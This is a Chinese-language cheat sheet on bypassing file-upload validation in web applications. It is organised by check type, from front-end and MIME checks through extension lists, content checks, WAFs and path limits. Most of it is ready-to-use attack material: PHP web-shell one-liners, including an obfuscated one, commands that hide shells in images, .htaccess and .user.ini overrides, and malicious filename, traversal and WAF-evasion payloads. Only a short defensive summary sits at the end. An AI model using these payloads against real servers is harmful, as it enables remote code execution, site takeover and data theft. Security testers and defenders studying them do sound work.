# <font size="5">文件上传漏洞绕过方法总结</font>

> 本文按**校验层次**分类整理绕过手法，每种方法都标注了适用场景和原理，便于按需查阅。

------

## <font size="5">一、绕过前端校验</font>

### <font size="5">1.1 禁用 JavaScript</font>

浏览器设置中禁用 JS，或使用 NoScript 插件，前端 `onsubmit` 校验直接失效。

### <font size="5">1.2 抓包改包</font>

用 Burp Suite 拦截上传请求，修改文件名后再放行：

text

```
Content-Disposition: form-data; name="file"; filename="shell.php"
```



前端校验的是原始文件名，服务端收到的是修改后的，前端形同虚设。

------

## <font size="5">二、绕过服务端 MIME 类型校验</font>

### <font size="5">2.1 伪造 Content-Type</font>

服务端若只检查请求头中的 `Content-Type`，直接改为允许的类型：

text

```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg        <-- 伪造此处

<?php system($_GET['cmd']); ?>
```



常见可伪造值：`image/jpeg`、`image/png`、`image/gif`、`application/octet-stream`。

### <font size="5">2.2 利用 MIME 推断与扩展名不一致</font>

部分框架基于**文件内容**推断 MIME，而非客户端提供的文件名扩展名：

- 上传名为 `shell.php`、内容以 `GIF89a` 开头的文件
- 框架推断 MIME 为 `image/gif`，通过校验
- 但文件名仍是 `shell.php`，最终被解析执行

------

## <font size="5">三、绕过后缀黑名单</font>

黑名单是最常见的校验方式，也是绕过手法最多的一类。

### <font size="5">3.1 大小写混写</font>

php

```
shell.PhP
shell.PHP
shell.pHp
```



适用：服务端用小写比较，但服务器解析时大小写不敏感（如 Windows + Apache）。

### <font size="5">3.2 双写绕过</font>

服务端将 `php` 替换为空字符串时：

text

```
shell.pphphp   →  替换一次 php 后 →  shell.php
```



适用：`str_replace('php', '', $filename)` 这类只替换一次的逻辑。

### <font size="5">3.3 特殊后缀</font>

利用服务器仍会解析的其他后缀：

| 语言 | 可用后缀                                                |
| ---- | ------------------------------------------------------- |
| PHP  | `php3` `php4` `php5` `php7` `phtml` `pht` `phps` `phar` |
| JSP  | `jspx` `jspf` `jspa`                                    |
| ASP  | `asa` `cer` `cdx(IIS 6.0)` `aspx`                       |
| 其他 | `exe` `sh` `py` `pl` `cgi`                              |

前提：服务器配置中这些后缀被映射到对应解析器。

### <font size="5">3.4 点号绕过</font>

text

```
shell.php.
shell.php..
shell.php...
```



原理：Windows 会自动去掉文件名末尾的点，最终保存为 `shell.php`。黑名单匹配时因为末尾有点而放行。

### <font size="5">3.5 空格绕过</font>

text

```
shell.php        （尾部空格）
shell.php%20
```



原理：部分 WAF 或校验逻辑未对文件名做 trim，正则 `\.php$` 匹配失败；但后端保存时可能规范化去掉空格，仍为 `.php`。

### <font size="5">3.6 ::$DATA 绕过（Windows）</font>

text

```
shell.php::$DATA
shell.php::$DATA.jpg
```



原理：Windows NTFS 文件流特性，`::$DATA` 后内容被忽略，实际保存为 `shell.php`。黑名单看到的是 `::$DATA` 后缀，不匹配。

### <font size="5">3.7 分号绕过</font>

text

```
shell.php;.jpg
shell.php;.png
```



原理：部分服务器把 `;` 当作参数分隔符，忽略其后内容；或 PHP-FPM 配置问题导致仍按 `.php` 解析。

### <font size="5">3.8 路径拼接绕过</font>

text

```
shell.php/.
shell.php/1.jpg
```



原理：某些解析逻辑取最后一个点后的内容作为扩展名，或者服务器规范化后仍解析为 PHP。

### <font size="5">3.9 换行 / 特殊字符</font>

text

```
shell.php%0a.jpg
shell.php%0d%0a.jpg
shell.php\x00.jpg
```

```
注：%0a：换行符；%0d%0a：回车换行；\x00(%00)：空字节
```



原理：利用解析差异，不同组件对特殊字符处理不一致。

------

## <font size="5">四、绕过后缀白名单</font>

白名单比黑名单严格，绕过难度更高，但仍存在以下路径。

### <font size="5">4.1 空字节截断（%00）</font>

text

```
shell.php%00.jpg
shell.php\x00.jpg
```



原理：旧版 PHP（< 5.3.4）中，`%00` 后的内容被截断，实际保存为 `shell.php`。现代 PHP 已修复。

### <font size="5">4.2 解析漏洞配合</font>

白名单要求 `.jpg`，但服务器存在解析漏洞：

| 服务器  | Payload           | 原理                                          |
| ------- | ----------------- | --------------------------------------------- |
| Apache  | `shell.php.jpg`   | `AddHandler` 从左向右匹配，遇到 `.php` 就解析 |
| Nginx   | `shell.jpg/x.php` | `cgi.fix_pathinfo=1` 时向上寻找可执行文件     |
| IIS 6.0 | `shell.asp;.jpg`  | 分号后内容被忽略                              |
| IIS 7.0 | `shell.jpg/.php`  | 路径解析差异                                  |
| Apache  | `shell.php.xxx`   | 未知后缀被当作 PHP 处理                       |

### <font size="5">4.3 .htaccess 覆盖</font>

如果允许上传 `.htaccess` 且 Apache 启用了 `AllowOverride`：

apache

```
AddType application/x-httpd-php .jpg
```



上传此 `.htaccess` 后，所有 `.jpg` 文件都会被当作 PHP 解析，随后上传 `shell.jpg` 即可。

**注意**：`.htaccess` 本身通常也在黑名单中，需要配合其他绕过手法。

### <font size="5">4.4 .user.ini 覆盖（PHP-FPM）</font>

text

```
auto_prepend_file = shell.jpg
```



上传 `.user.ini` 后，同目录下所有 PHP 文件执行前都会包含 `shell.jpg`。

适用：Nginx + PHP-FPM 环境，`.user.ini` 是 PHP 官方支持的每目录配置。

【每目录配置： `.user.ini` 文件只对它所放置的那个目录（以及其子目录）生效】

### <font size="5">4.5 文件包含配合</font>

白名单严格到无法直接上传可执行文件时，结合**文件包含漏洞**：

text

```
http://target/index.php?file=uploads/shell.jpg
```



此时 `shell.jpg` 中的 PHP 代码被包含并执行。

**图片马制作**：

bash

```
copy normal.jpg/b + shell.php/a webshell.jpg
```



```
/a：ASCII 文本模式
/b：二进制模式

normal.jpg/b：告诉 copy 把图片当作纯二进制数据，完整读取所有字节，不误判 CTRL+Z 为结束。

shell.php/a：告诉 copy 把 PHP 脚本当作文本，只读取其内容（忽略可能的文本结束符）。
```

或直接在图片末尾追加：

bash

```
echo '<?php system($_GET["c"]); ?>' >> normal.jpg
```

## <font size="5">五、绕过内容检测</font>

### <font size="5">5.1 文件头伪造</font>

服务端检测文件头（Magic Number）时，在恶意文件开头添加合法文件头：

| 类型 | 文件头                    |
| ---- | ------------------------- |
| GIF  | `GIF89a`                  |
| JPEG | `FF D8 FF E0`             |
| PNG  | `89 50 4E 47 0D 0A 1A 0A` |
| ZIP  | `50 4B 03 04`             |
| PDF  | `25 50 44 46`             |

示例：

php

```
GIF89a
<?php system($_GET['cmd']); ?>
```



服务器读到 `GIF89a` 认为合法，但后续 PHP 代码仍可执行（需配合解析漏洞或文件包含）。

### <font size="5">5.2 图片马</font>

将 PHP 代码嵌入真实图片：

bash

```
# 方法一：copy 合并
copy normal.jpg/b + shell.php/a webshell.jpg

# 方法二：echo 追加
echo '<?php @eval($_POST["x"]); ?>' >> normal.jpg

# 方法三：ExifTool 写入注释
exiftool -Comment='<?php system($_GET["c"]); ?>' normal.jpg
```



配合文件包含、.htaccess、解析漏洞使用。

### <font size="5">5.3 二次渲染绕过</font>

上传图片后服务端会重新渲染（如 GD 库压缩），普通图片马会被破坏。绕过方法：

- 分析渲染后仍保留的字节区域，将 Payload 插入该区域
- 使用 GIF 格式（GIF 渲染后保留调色板区域）
- 使用 PNG 的 IDAT 块或 tEXt 块
- 工具：`png_payload`、`gifsicle`

### <font size="5">5.4 编码 / 加密绕过</font>

- **Base64**：`<?php eval(base64_decode($_POST['x'])); ?>`
- **异或加密**：Payload 异或后传输，运行时解密
- **混淆**：字符串拼接、变量函数、动态调用

php

```
<?php
$a = 'sys'.'tem';
$a($_GET['c']);
?>
```



### <font size="5">5.5 短标签 / 无标签</font>

php

```
<?= system($_GET['c']); ?>
<? system($_GET['c']); ?>
<script language="php">system($_GET['c']);</script>
```



适用于 `short_open_tag` 开启或特定解析环境。

## <font size="5">六、绕过 WAF</font>

### <font size="5">6.1 分块传输（Chunked Transfer-Encoding）</font>

text

```
Transfer-Encoding: chunked
```



将 Payload 拆分成多个 chunk 发送，WAF 可能无法还原完整内容。

### <font size="5">6.2 参数污染</font>

text

```
Content-Disposition: form-data; name="file"; filename="shell.php"; filename="shell.jpg"
```



利用不同组件解析差异，WAF 取第一个，服务端取最后一个。

### <font size="5">6.3 大小写 / 编码变形</font>

- `Content-Type: IMAGE/JPEG`
- `filename="shell.PHP"`
- URL 编码、Unicode 编码、HTML 实体编码

### <font size="5">6.4 垃圾数据填充</font>

在文件开头填充大量垃圾字符，使 WAF 因长度限制放弃检测，但服务端仍能正常解析。

### <font size="5">6.5 换行 / 空格混淆</font>

text

```
Content-Disposition: form-data;
    name="file";
    filename="shell.php"
```



利用 WAF 规则匹配不严谨绕过。

### <font size="5">6.6 利用 WAF 与后端解析差异</font>

| 差异点       | 绕过思路                           |
| ------------ | ---------------------------------- |
| 文件名标准化 | WAF 未 trim，后端 trim（空格绕过） |
| 路径解析     | WAF 看整体，后端只看 basename      |
| 编码处理     | WAF 不解码，后端解码               |
| MIME 解析    | WAF 看 Content-Type，后端看文件头  |

------

## <font size="5">七、绕过路径与权限限制</font>

### <font size="5">7.1 路径遍历</font>

text

```
filename="../../../../var/www/html/shell.php"
filename="..%2f..%2f..%2fshell.php"
```



适用：服务端未对 `filename` 做路径过滤，直接拼接保存路径。

### <font size="5">7.2 绝对路径</font>

text

```
filename="/var/www/html/shell.php"
filename="C:\inetpub\wwwroot\shell.php"
```



### <font size="5">7.3 符号链接</font>

先上传一个正常文件，再通过其他漏洞（如命令执行）创建软链接，指向敏感路径。

### <font size="5">7.4 竞争条件</font>

某些逻辑是"先保存到临时目录 → 校验 → 移动到正式目录"，校验失败会删除。利用时间窗口：

1. 上传恶意文件到临时目录
2. 在校验删除前，通过其他请求访问临时文件
3. 或利用多线程竞争，在删除前触发执行

------

## <font size="5">八、绕过大小与数量限制</font>

### <font size="5">8.1 分块上传</font>

将大文件拆成多个小请求，服务端拼接。

### <font size="5">8.2 压缩包</font>

上传 zip/tar，利用服务端解压逻辑（如路径遍历、解压炸弹）。

### <font size="5">8.3 Content-Length 伪造</font>

修改 `Content-Length` 头，使服务端读取不完整或超出预期。

------

## <font size="5">九、组合利用思路</font>

### <font size="5">9.1 上传 + 文件包含</font>

text

```
上传 shell.jpg（含 PHP 代码）
    ↓
利用文件包含漏洞执行
http://target/?file=uploads/shell.jpg
```



### <font size="5">9.2 上传 + 解析漏洞</font>

text

```
上传 shell.php.jpg
    ↓
Apache 从左向右解析，遇到 .php 执行
```



### <font size="5">9.3 上传 + .htaccess</font>

text

```
上传 .htaccess（AddType application/x-httpd-php .jpg）
    ↓
上传 shell.jpg
    ↓
shell.jpg 被当作 PHP 执行
```



### <font size="5">9.4 上传 + 数据库</font>

上传含恶意 SQL 的文件，配合 SQL 注入的文件读取功能。

### <font size="5">9.5 上传 + SSRF</font>

上传含外链的文件（如 SVG、XML），服务端解析时发起请求，探测内网。

### <font size="5">9.6 上传 + XSS</font>

上传 SVG/HTML，管理员预览时触发存储型 XSS，窃取 Cookie。

## <font size="5">十一、防御视角的总结</font>

理解绕过方法的最终目的是为了更好地防御。从防御角度看：

1. **白名单 + 内容检查 + 随机命名 + 隔离存储 + 禁用执行**，五者缺一不可
2. 任何单一校验都可能被绕过，必须**多层叠加**
3. 最关键的防线是**上传目录禁止脚本执行**——即使恶意文件上传成功，也无法执行
4. 定期关注 **CVE / 框架更新**，很多绕过手法依赖特定版本的解析缺陷
5. 不要信任任何客户端输入：文件名、Content-Type、文件内容都可能被伪造

> **一句话**：绕过的本质是"校验逻辑"与"实际执行逻辑"之间的**解析差异**。找到差异点，就找到了绕过路径。
